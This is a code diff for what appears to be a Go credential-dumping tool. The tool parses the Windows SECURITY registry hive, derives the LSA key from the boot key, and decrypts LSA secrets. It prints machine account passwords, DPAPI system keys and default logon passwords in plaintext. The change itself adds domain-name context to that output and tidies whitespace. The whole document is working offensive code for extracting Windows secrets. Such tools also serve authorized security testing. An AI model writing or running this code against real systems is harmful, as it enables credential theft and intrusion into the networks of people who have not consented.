@@ -6,70 +6,68 @@ import (
 	"strings"
 )
 
-func parseSECURITY(data []byte, bootKey []byte) {
+func parseSECURITY(data []byte, bootKey []byte, domainName string, isDomainJoined bool) {
 	hive, err := parseHive(data)
 	if err != nil {
 		fmt.Printf("[+] failed to parse security hive\n")
 		return
 	}
-	
+
 	_, err = hive.ReadNKRecord(hive.RootCellIndex)
 	if err != nil {
 		fmt.Printf("[+] failed to read root key\n")
 		return
 	}
-	
-	
+
 	lsaKey := extractLSAKeyFromSecurity(hive, bootKey)
 	if lsaKey == nil {
 		fmt.Printf("[+] failed to extract lsa key from security hive, using boot key fallback\n")
 		lsaKey = bootKey
 	}
-	
-	
+
 	secretsKey, err := hive.FindKey("Policy\\Secrets")
 	if err != nil {
 		return
 	}
-	
+
 	fmt.Println("\n╔════════════════════════════════════════════════════════════╗")
 	fmt.Println("║                       lsa secrets                          ║")
 	fmt.Println("╚════════════════════════════════════════════════════════════╝")
-	
+
 	subkeys := hive.GetSubkeys(secretsKey)
 	fmt.Printf("\n[+] found %d secret entries\n", len(subkeys))
-	
+
 	for _, secretKey := range subkeys {
 		secretName := secretKey.Name
 		fmt.Printf("\n[+] processing secret: %s\n", secretName)
-		
+
 		currValKey, err := hive.FindKey("Policy\\Secrets\\" + secretName + "\\CurrVal")
 		if err != nil {
 			fmt.Printf("    [!] failed to find CurrVal key: %v\n", err)
 			continue
 		}
-		
+
 		values := hive.GetValues(currValKey)
 		var encryptedSecret []byte
-		
+
 		for _, vk := range values {
 			if len(vk.Data) > 0 && encryptedSecret == nil {
 				encryptedSecret = vk.Data
 				break
 			}
 		}
-		
+
 		if encryptedSecret == nil || len(encryptedSecret) < 28 {
 			continue
 		}
-		
+
 		secretData := decryptLSASecret(encryptedSecret, lsaKey)
 		if secretData == nil || len(secretData) == 0 {
 			fmt.Printf("    [!] decryption failed or result too small\n")
 			continue
 		}
-		
-		displaySecret(secretName, secretData)
+
+		displaySecret(secretName, secretData, domainName, isDomainJoined)
 	}
 }
 
@@ -84,12 +82,10 @@ func decryptLSASecret(encryptedSecret []byte, lsaKey []byte) []byte {
 		return nil
 	}
 
-	salt := encryptedData[:32] 
-	cipherText := encryptedData[32:]  
-
+	salt := encryptedData[:32]
+	cipherText := encryptedData[32:]
 
 	derivedKey := deriveSHA256Key(lsaKey, salt)
-
 
 	key32 := derivedKey[:32]
 	zeroIV := make([]byte, 16)
@@ -124,9 +120,9 @@ func decryptLSASecret(encryptedSecret []byte, lsaKey []byte) []byte {
 	return secret
 }
 
-func displaySecret(name string, data []byte) {
+func displaySecret(name string, data []byte, domainName string, isDomainJoined bool) {
 	fmt.Printf("\n[+] secret: %s\n", name)
-	
+
 	if strings.HasPrefix(name, "$MACHINE.ACC") {
 		fmt.Printf("    type: machine account password\n")
 		if len(data) > 0 {
@@ -144,8 +140,8 @@ func displaySecret(name string, data []byte) {
 	} else if strings.HasPrefix(name, "DPAPI_SYSTEM") {
 		fmt.Printf("    type: dpapi system key\n")
 		if len(data) >= 44 {
-			machineKey := data[4:24]  
-			userKey := data[24:44] 
+			machineKey := data[4:24]
+			userKey := data[24:44]
 			fmt.Printf("    dpapi_machinekey: %x\n", machineKey)
 			fmt.Printf("    dpapi_userkey: %x\n", userKey)
 		} else {
@@ -162,6 +158,11 @@ func displaySecret(name string, data []byte) {
 			password := utf16ToString(data)
 			if password != "" {
 				fmt.Printf("    password: %s\n", password)
+				if isDomainJoined {
+					fmt.Printf("    domain: %s (domain-joined)\n", domainName)
+				} else {
+					fmt.Printf("    domain: local (workgroup)\n")
+				}
 			}
 		}
 	} else if strings.HasPrefix(name, "DefaultPassword") {
@@ -220,9 +221,9 @@ func extractLSAKeyFromSecurity(hive *RegistryHive, bootKey []byte) []byte {
 			return nil
 		}
 	}
-	
+
 	var encryptedKey []byte
-	
+
 	if polKeyNK.SubkeyCount > 0 {
 		subkeys := hive.GetSubkeys(polKeyNK)
 		for _, sk := range subkeys {
@@ -240,7 +241,7 @@ func extractLSAKeyFromSecurity(hive *RegistryHive, bootKey []byte) []byte {
 			}
 		}
 	}
-	
+
 	if encryptedKey == nil && polKeyNK.ValueCount > 0 {
 		values := hive.GetValues(polKeyNK)
 		for _, vk := range values {
@@ -250,15 +251,13 @@ func extractLSAKeyFromSecurity(hive *RegistryHive, bootKey []byte) []byte {
 			}
 		}
 	}
-	
+
 	if encryptedKey == nil || len(encryptedKey) < 28 {
 		return nil
 	}
-	
 
-	
 	lsaKey := decryptLSAKeyData(encryptedKey, bootKey)
-	
+
 	if lsaKey != nil {
 		fmt.Printf("[+] decrypted LSA key:")
 		for i := 0; i < len(lsaKey); i++ {
@@ -266,8 +265,6 @@ func extractLSAKeyFromSecurity(hive *RegistryHive, bootKey []byte) []byte {
 		}
 		fmt.Printf("\n\n")
 	}
-	
+
 	return lsaKey
 }
-
-
